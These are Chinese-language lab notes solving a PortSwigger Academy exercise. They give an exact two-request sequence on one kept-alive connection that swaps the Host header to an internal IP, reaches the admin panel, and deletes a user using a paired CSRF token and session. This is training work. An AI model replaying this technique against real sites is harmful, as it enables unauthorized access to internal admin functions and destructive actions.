---
title: "records/lab-host-header-host-validation-bypass-via-connection-state-attack"
---

# records/lab-host-header-host-validation-bypass-via-connection-state-attack

# lab-host-header-host-validation-bypass-via-connection-state-attack

PortSwigger Academy：host 头校验绕过（连接状态攻击）。内网管理面板在 192.168.0.1/admin，目标是删掉 carlos。

## 面与判据

- 边缘（academy edge）是现代墙：裸件（不带 cookie）的毒 Host 系统性 4xx。首请求 Host 为内网 IP → 403 Client Error: Forbidden（109B，不下发 _lab）；同连接第二个不同 Host → 421 Invalid host；重复 Host → 400 {"error":"Duplicate header names are not allowed"}；Host 大小写变体、子域、绝对请求行、X-Forwarded-Host 全不放行。
- 钥匙 = 实例的 _lab cookie：http_session get 实例根 --jar jar 取到后，边缘放行毒 Host，交给 lab app。
- 判读：4xx 不带 _lab = 边缘所发；带 _lab 的 4xx = lab app 所发。

## 步骤（同一 TCP 连接两条请求，conn_reuse --sequential）

1. http_session get 实例根 --jar jar 取 _lab。
2. 第 1 条：GET / HTTP/1.1 + Host: 实例域 + Cookie: _lab=<v> + Connection: keep-alive，建立连接态（边缘校验只作用于连接首请求）。
3. 第 2 条：GET /admin HTTP/1.1 + Host: 192.168.0.1 + Cookie: _lab=<v> → 200 内网管理面板（labs.css、Cache-Control: no-cache），含 csrf 隐藏域与 Set-Cookie: session=<S>。
4. 另起一条连接态序列，第 2 条改 POST /admin/delete + Host: 192.168.0.1 + Cookie: _lab=<v>; session=<S> + Content-Type: application/x-www-form-urlencoded + Content-Length: 53 + body csrf=<T>&username=carlos → 302 Location: /。
5. banner_verdict 实例 --jar jar → solved: true、Congratulations, you solved the lab!。

## 坑

- 平台限流：同连接短窗连发会 Resource temporarily unavailable (os error 11)；隔 10s 重试或加 --gap-ms。
- /admin/delete 的 csrf 与面板 session 必须配对；csrf 每次 GET /admin 都变，两个值取自同一次面板响应。
- 首请求的 Host 必须是实例域（403 的 allowlist 只在连接首请求生效，这正是本题的连接态松弛）。

## 关系

- 家族：[[host-header-family]]；边缘墙口径：[[academy-edge-lab-cookie-gate]]；平台细节：[[portswigger-platform-specifics]]。
